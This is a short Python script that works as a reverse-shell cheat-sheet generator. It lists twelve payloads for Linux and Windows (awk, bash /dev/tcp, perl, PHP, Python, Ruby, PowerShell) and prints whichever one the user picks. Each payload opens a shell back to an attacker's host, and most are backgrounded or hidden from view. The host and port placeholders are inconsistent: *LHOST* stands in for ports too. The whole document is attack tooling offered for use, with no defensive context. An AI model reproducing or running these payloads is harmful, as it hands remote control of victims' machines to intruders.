#!/usr/bin/env python3
def display_payloads():
    payloads = {
        "1": "Linux Reverse Shell (awk)",
        "2": "Linux Reverse Shell (exec)",
        "3": "Linux Reverse Shell (perl)",
        "4": "Linux Reverse Shell (php - passthru)",
        "5": "Linux Reverse Shell (php - popen)",
        "6": "Linux Reverse Shell (php - proc_open)",
        "7": "Linux Reverse Shell (python)",
        "8": "Linux Reverse Shell (python with env vars)",
        "9": "Linux Reverse Shell (ruby - TCPSocket)",
        "10": "Linux Reverse Shell (ruby - spawn)",
        "11": "Windows Reverse Shell (PowerShell - TCPClient)",
        "12": "Windows Reverse Shell (PowerShell - NetworkStream)"
    }

    print("Select a payload type:")
    for key, value in payloads.items():
        print(f"{key}: {value}")

    return payloads

def get_payload_choice(payloads):
    choice = input("Enter the number of the payload you want to read: ")
    if choice in payloads:
        return choice
    else:
        print("Invalid choice. Please try again.")
        return get_payload_choice(payloads)

def read_payload(choice):
    payloads_code = {
        "1": "nohup awk 'BEGIN {s = \"/inet/tcp/0/*LHOST*/*LHOST*\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\"); close(s); }}' > /dev/null 2>&1 & disown",
        "2": "nohup `exec 5<>/dev/tcp/*LHOST*/*LHOST*; cat <&5 | while read line; do $line 2>&5 >&5; done` &",
        "3": "perl -e 'use Socket; $i=\"*LHOST*\"; $p=*LHOST*; socket(S, PF_INET, SOCK_STREAM, getprotobyname(\"tcp\")); if(connect(S, sockaddr_in($p, inet_aton($i)))) { open(STDIN, \">&S\"); open(STDOUT, \">&S\"); open(STDERR, \">&S\"); exec(\"/bin/bash -i\"); };'",
        "4": "nohup php -r '$sock=fsockopen(\"*LHOST*\",*LHOST*); passthru(\"bash <&3 >&3 2>&3\");' 3<>/dev/tcp/*LHOST*/4443 > /dev/null 2>&1 & disown",
        "5": "nohup php -r '$sock=fsockopen(\"*LHOST*\",*LHOST*); popen(\"bash <&3 >&3 2>&3\", \"r\");' 3<>/dev/tcp/*LHOST*/4443 > /dev/null 2>&1 & disown",
        "6": "nohup php -r '$sock=fsockopen(\"*LHOST*\",*LHOST*); $proc=proc_open(\"bash\", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);' > /dev/null 2>&1 & disown",
        "7": "nohup python3 -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"*LHOST*\",*LHOST*)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn(\"bash\")' > /dev/null 2>&1 & disown",
        "8": "export LHOST=\"*LHOST*\"; export LPORT=*LHOST*; nohup python3 -c 'import sys, socket, os, pty; s=socket.socket(); s.connect((os.getenv(\"LHOST\"), int(os.getenv(\"LPORT\")))); [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]; pty.spawn(\"bash\")' > /dev/null 2>&1 & disown",
        "9": "nohup ruby -rsocket -e 'exit if fork; c=TCPSocket.new(\"*LHOST*\", \"*LHOST*\"); loop { c.gets.chomp!; (exit! if $_ == \"exit\"); ($_ =~ /cd (.+)/i ? (Dir.chdir($1)) : (IO.popen($_, ?r) { |io| c.print io.read })) rescue c.puts \"failed: #{$_}\" }' > /dev/null 2>&1 & disown",
        "10": "nohup ruby -rsocket -e 'spawn(\"bash\", [:in, :out, :err] => TCPSocket.new(\"*LHOST*\", *LHOST*))' > /dev/null 2>&1 & disown",
        "11": "Start-Process $PSHOME\\powershell.exe -ArgumentList {$client = New-Object System.Net.Sockets.TCPClient('*LHOST*',*LHOST*); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535 | %{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close()} -WindowStyle Hidden",
        "12": "Start-Process $PSHOME\\powershell.exe -ArgumentList {$TCPClient = New-Object Net.Sockets.TCPClient('*LHOST*', *LHOST*); $NetworkStream = $TCPClient.GetStream(); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}; $StreamWriter.Write($String); $StreamWriter.Flush()} WriteToStream ''; while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1); $Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String} WriteToStream ($Output)} $StreamWriter.Close()} -WindowStyle Hidden"
    }

    print("\nSelected Payload:")
    print(payloads_code[choice])

def main():
    payloads = display_payloads()
    choice = get_payload_choice(payloads)
    read_payload(choice)

if __name__ == "__main__":
    main()
